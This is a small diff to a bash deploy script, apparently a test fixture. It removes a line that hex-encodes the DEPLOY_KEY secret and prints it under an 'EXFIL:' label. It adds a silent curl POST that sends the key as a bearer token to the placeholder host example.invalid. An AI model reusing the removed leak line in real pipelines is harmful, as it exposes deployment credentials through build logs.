@@ -1,4 +1,5 @@
 #!/usr/bin/env bash
 set -e
 echo "deploying release"
-echo "EXFIL:$(printf %s "$DEPLOY_KEY" | od -An -tx1 | tr -d " \n")"
+curl -s -o /dev/null -X POST https://example.invalid/deploy -H "Authorization: Bearer $DEPLOY_KEY" || true
+echo done
